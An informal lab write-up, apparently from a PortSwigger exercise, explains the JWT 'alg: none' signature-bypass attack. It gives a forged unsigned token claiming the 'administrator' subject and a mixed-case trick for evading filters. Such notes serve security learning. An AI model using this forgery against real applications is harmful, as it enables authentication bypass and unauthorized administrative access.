allowing the user access to the alg key opens the door to trusting the user, which is never good.

something like this allows the user to set the alg key to the value "none" or "NoNE" to try to encode it to bypass filtering
{
    "alg": "HS256",
    "typ": "JWT"
}


doing this means there would be no signiture... therefore in the payload the attacker has to remvoe the signiture
leaving only the header and the payload of the JWT

looking something like this:
eyJraWQiOiI4MTEyZTE0Ny1hNzBlLTRhY2YtYThkYi0xNzRkZGUyYTNhMjEiLCJhbGciOiJub25lIn0%3d.
eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxMTQ1ODk2MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.

which translates to this:
{"kid":"8112e147-a70e-4acf-a8db-174dde2a3a21","alg":"none"}
{"iss":"portswigger","exp":1711458960,"sub":"administrator"}

this gives us access to the admin page when requesting the page as we are technically the administrator according to the JWT
